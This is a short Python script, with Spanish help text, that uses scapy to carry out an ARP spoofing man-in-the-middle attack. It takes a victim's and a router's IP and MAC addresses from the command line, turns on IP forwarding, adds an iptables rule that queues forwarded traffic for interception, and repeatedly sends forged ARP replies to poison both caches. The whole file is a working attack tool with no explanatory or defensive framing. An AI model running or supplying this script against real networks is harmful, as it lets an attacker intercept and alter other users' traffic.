import scapy.all as scapy 
import time
import sys
import os
import optparse

def get_arguments():
    parser=optparse.OptionParser()
    parser.add_option("--target", dest = "target_ip", help="La ip de la victima")
    parser.add_option("--targetmac", dest = "target_mac", help="La MAC de la victima")
    parser.add_option("--gateway", dest = "gateway_ip", help="La ip del router")
    parser.add_option("--gatewaymac", dest = "gateway_mac", help="La MAC del router")
    (options, arguments) = parser.parse_args()
    return options

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

# target_ip = "192.168.1.93"
# gateway_ip = "192.168.1.1"
# target_mac = "c8:e2:65:63:8d:05"
# gateway_mac = "cc:d4:a1:e9:89:de"
os.popen("iptables -I FORWARD -j NFQUEUE --queue-num 0")
os.popen("echo 1 > /proc/sys/net/ipv4/ip_forward")


options = get_arguments()
sent_packet_count = 0
try:
    while True:
        spoof(options.target_ip, options.gateway_ip, options.target_mac)
        spoof(options.gateway_ip, options.target_ip, options.gateway_mac)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packets sent: " + str(sent_packet_count)),
        time.sleep(2)

except KeyboardInterrupt:
        print("[+] Cerrando ARP SPOOF")